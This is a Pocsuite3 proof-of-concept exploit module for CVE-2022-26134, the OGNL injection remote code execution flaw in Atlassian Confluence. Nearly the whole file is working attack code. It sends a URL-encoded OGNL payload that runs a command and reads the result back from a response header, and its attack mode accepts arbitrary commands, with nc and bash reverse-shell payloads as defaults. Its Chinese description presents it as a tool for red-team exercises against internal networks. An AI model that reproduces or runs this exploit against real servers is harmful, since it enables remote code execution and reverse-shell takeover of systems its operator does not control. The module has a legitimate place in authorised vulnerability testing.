from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import urllib3
urllib3.disable_warnings()
class DemoPOC(POCBase):
    vulID = 'CVE-2022-26134'  # ssvid
    version = '1.0'
    name = 'Confluence OGNL injection vulnerability.'
    appName = 'Confluence'
    appVersion = '1.3.0~7.18.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Confluence是一个专业的企业知识协调软件。HW常见系统，内网中十有八九碰到，当然外网也有，本次存在OGNL 注入rce漏洞，这次漏洞范围不小。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self): # 接收用户外部输出参数command
        o = OrderedDict()
        payload = {
            "nc": REVERSE_PAYLOAD.NC,
            "bash": REVERSE_PAYLOAD.BASH,
        }
        o["command"] = OptDict(selected="bash", default=payload)
        return o

    def _verify(self):#验证模式
        result = {}
        target = self.url+"//%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
        try:
            r = requests.get(url=target,verify=False, allow_redirects=False)
            if r.status_code == 302:
                result['FileInfo'] = {}
                result['FileInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return

    def _attack(self): #交互式command
        result = {}
        cmd = self.get_option("command")
        print(cmd)
        try:
            target = self.url+"//%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/".format(cmd)
            r = requests.get(url=target,verify=False, allow_redirects=False)
            if r.status_code == 302:
                print(r.headers['X-Cmd-Response'])
                result['verifyInfo']={}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
        	return

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)